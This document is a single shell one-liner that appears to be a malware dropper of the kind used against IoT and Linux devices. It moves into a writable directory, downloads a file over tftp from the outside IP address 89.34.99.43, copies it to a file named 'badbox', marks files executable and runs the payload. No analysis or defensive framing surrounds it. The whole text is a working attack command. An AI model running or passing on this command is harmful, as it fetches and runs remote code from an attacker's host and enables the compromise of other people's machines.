cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 89.34.99.43;cat wget >badbox;chmod +x *;./badbox
